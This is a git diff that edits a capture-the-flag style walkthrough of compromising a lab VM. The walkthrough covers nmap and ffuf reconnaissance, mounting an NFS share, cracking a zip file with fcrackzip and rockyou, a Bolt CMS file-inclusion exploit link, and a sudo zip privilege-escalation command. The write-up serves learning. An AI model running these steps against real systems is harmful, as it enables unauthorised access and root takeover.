@@ -22,9 +22,12 @@ I then ran Netdiscover to get target IP, (for me).
 ```markdown
 sudo netdiscover -r 192.168.22.0/24
 ```
-I find our target VM
+I find my target VM
+
 192.168.22.136
+
 Next step is to run NMAP
+
 ```markdown
 sudo nmap -A -p- -T4 192.168.22.136
 ```
@@ -33,6 +36,7 @@ sudo nmap -A -p- -T4 192.168.22.136
 ![image](https://user-images.githubusercontent.com/66864342/160243035-fb8b2c2a-664a-43e4-8244-7aba436d9488.png)
 
 Interesting ports and info
+
 - 22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 - 80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
 - _http-server-header: Apache/2.4.38 (Debian)
@@ -50,12 +54,13 @@ Interesting ports and info
 - Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel!
 
 Browse to port http://192.168.22.136:80
+
 Default webpage bolt installation error?
 
 ![image](https://user-images.githubusercontent.com/66864342/160243232-38f450e6-66ee-4140-946f-4cf00e9c9f08.png)
 
 
-Browse to http://192.168.22.136:8080
+I browsed to http://192.168.22.136:8080
 Discovered PHP settings
 
 
@@ -63,17 +68,19 @@ Discovered PHP settings
 
 
 Then I ran FFUF to parse web folders in two tabs
+
 ```markdown
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.22.136/FUZZ
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.22.136:8080/FUZZ
 ```
 
-So then I checked NFS
+So, then I checked NFS
 ```markdown
 Showmount -e 192.168.22.136 for nfs
 ```
 
 mkdir in mnt i called it nfs
+
 ```markdown
 cd mnt
 mkdir nfs
@@ -87,6 +94,7 @@ In nfs folder I found a file called save.zip
 
 
 However the file is password protected. so I tried fcrack!
+
 ```markdown
 Fcrack -v -u -D -p /usr/share/wordlists/rockyou.txt
 ```
@@ -122,8 +130,10 @@ Opened config.yaml and we Find a username & password
 
 
 
-I wnet back to port 80 and see what bolt is...
+I went back to port 80 tp see what bolt is...
+
 After Googling, it seems to be a CMS, I also find an exploit for a local file inclusion
+
 https://www.exploit-db.com/exploits/48411
 
 
@@ -159,11 +169,13 @@ sudo -l
 So the above means I can run zip as root
 
 So goto GTFOBINS
+
 https://gtfobins.github.io/
 
 search for ZIP, and get the sudo one
 
-type commands one line at a time
+I typed commands one line at a time
+
 ```markdown
 TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
